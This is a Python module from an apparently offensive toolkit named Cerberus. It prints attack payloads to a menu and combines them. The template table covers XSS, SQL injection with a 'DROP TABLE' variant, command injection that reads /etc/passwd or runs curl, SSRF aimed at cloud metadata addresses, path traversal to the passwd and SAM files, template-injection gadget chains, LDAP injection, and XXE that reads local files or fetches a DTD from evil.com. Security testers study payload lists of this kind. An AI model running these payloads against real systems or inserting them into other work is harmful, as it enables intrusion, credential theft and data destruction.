"""
Cerberus Payload Generator Module
Custom payload generation for various attack vectors
"""

from ..core import Colors, box_title, menu_option, separator
from ..connectors import get_connector, get_available_models, MODELS


# ============================================================
# PAYLOAD TEMPLATES
# ============================================================

PAYLOAD_TEMPLATES = {
    "1": {
        "name": "XSS Payload",
        "category": "Web",
        "template": "<script>{}</script>",
        "variations": [
            "<img src=x onerror='{}'>",
            "<svg onload='{}'>",
            "javascript:{}",
            "<iframe src='javascript:{}'>",
        ]
    },
    "2": {
        "name": "SQL Injection",
        "category": "Database",
        "template": "' OR {} --",
        "variations": [
            "1=1",
            "admin' --",
            "UNION SELECT {}",
            "'; DROP TABLE {};--",
        ]
    },
    "3": {
        "name": "Command Injection",
        "category": "System",
        "template": "; {}",
        "variations": [
            "cat /etc/passwd",
            "ls -la",
            "whoami",
            "curl {}",
        ]
    },
    "4": {
        "name": "SSRF Template",
        "category": "Web",
        "template": "http://{}",
        "variations": [
            "localhost",
            "127.0.0.1",
            "metadata.aws.internal",
            "169.254.169.254",
        ]
    },
    "5": {
        "name": "Path Traversal",
        "category": "Web",
        "template": "../{}",
        "variations": [
            "../../etc/passwd",
            "....//....//etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f",
        ]
    },
    "6": {
        "name": "Template Injection",
        "category": "Web",
        "template": "{{{} }}",
        "variations": [
            "7*7",
            "config",
            "self.__class__.__mro__[2].__subclasses__()",
            "request.application.__globals__",
        ]
    },
    "7": {
        "name": "XXE Payload",
        "category": "XML",
        "template": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{}">]><foo>&xxe;</foo>""",
        "variations": [
            "file:///etc/passwd",
            "http://evil.com/evil.dtd",
            "php://filter/convert.base64-encode/resource=config.php",
        ]
    },
    "8": {
        "name": "LDAP Injection",
        "category": "Directory",
        "template": "*)({}",
        "variations": [
            "objectClass=*",
            "uid=*",
            ")(uid=*))(|(uid=*",
        ]
    },
}


# ============================================================
# MODULE FUNCTIONS
# ============================================================

def module_payload_generator():
    """Generate custom payloads"""
    print(box_title("PAYLOAD GENERATOR - Premium"))
    
    print(f"""
{Colors.BOLD}Select Payload Type:{Colors.RESET}
{menu_option('1', 'XSS', 'Cross-Site Scripting payloads')}
{menu_option('2', 'SQL Injection', 'SQLi payloads')}
{menu_option('3', 'Command Injection', 'OS command payloads')}
{menu_option('4', 'SSRF', 'Server-Side Request Forgery')}
{menu_option('5', 'Path Traversal', 'Directory traversal')}
{menu_option('6', 'Template Injection', 'SSTI payloads')}
{menu_option('7', 'XXE', 'XML External Entity')}
{menu_option('8', 'LDAP Injection', 'LDAP injection')}
{menu_option('9', 'Custom Builder', 'Build custom payload')}
{menu_option('q', 'Back', 'Return to main menu')}
    """)
    
    choice = input(f"{Colors.CYAN}Select > {Colors.RESET}").strip().lower()
    
    if choice == "q":
        return
    
    if choice == "9":
        custom_payload_builder()
        input(f"\n{Colors.GRAY}Press Enter to continue...{Colors.RESET}")
        return
    
    template = PAYLOAD_TEMPLATES.get(choice)
    if not template:
        print(f"{Colors.RED}Invalid selection{Colors.RESET}")
        input(f"\n{Colors.GRAY}Press Enter to continue...{Colors.RESET}")
        return
    
    print(f"\n{Colors.BOLD}{template['name']} - {template['category']}{Colors.RESET}")
    print(separator(60))
    
    print(f"\n{Colors.CYAN}Template:{Colors.RESET} {template['template']}")
    print(f"\n{Colors.CYAN}Variations:{Colors.RESET}")
    for i, v in enumerate(template['variations'], 1):
        print(f"  {i}. {v}")
    
    print(f"\n{Colors.YELLOW}Generate all combinations? (y/n): {Colors.RESET}", end="")
    if input().strip().lower() == "y":
        generate_all_payloads(template)
    
    input(f"\n{Colors.GRAY}Press Enter to continue...{Colors.RESET}")


def generate_all_payloads(template):
    """Generate all payload variations"""
    print(f"\n{Colors.BOLD}Generated Payloads:{Colors.RESET}")
    print(separator(60))
    
    for i, variation in enumerate(template['variations'], 1):
        # Handle template with placeholder
        if '{}' in template['template']:
            payload = template['template'].format(variation)
        else:
            payload = variation
        print(f"  {i}. {payload}")


def custom_payload_builder():
    """Build custom payloads interactively"""
    print(box_title("CUSTOM PAYLOAD BUILDER"))
    
    print(f"\n{Colors.CYAN}Enter your base template (use {{}} as placeholder):{Colors.RESET}")
    template = input(f"{Colors.YELLOW}> {Colors.RESET}").strip()
    
    if not template:
        print(f"{Colors.RED}Empty template!{Colors.RESET}")
        return
    
    print(f"\n{Colors.CYAN}Enter variations (one per line, empty line to finish):{Colors.RESET}")
    variations = []
    while True:
        line = input(f"{Colors.YELLOW}> {Colors.RESET}").strip()
        if not line:
            break
        variations.append(line)
    
    if not variations:
        print(f"{Colors.RED}No variations provided!{Colors.RESET}")
        return
    
    print(f"\n{Colors.BOLD}Generated Payloads:{Colors.RESET}")
    print(separator(60))
    
    for i, variation in enumerate(variations, 1):
        if '{}' in template:
            payload = template.format(variation)
        else:
            payload = variation
        print(f"  {i}. {payload}")


__all__ = ["module_payload_generator", "PAYLOAD_TEMPLATES"]
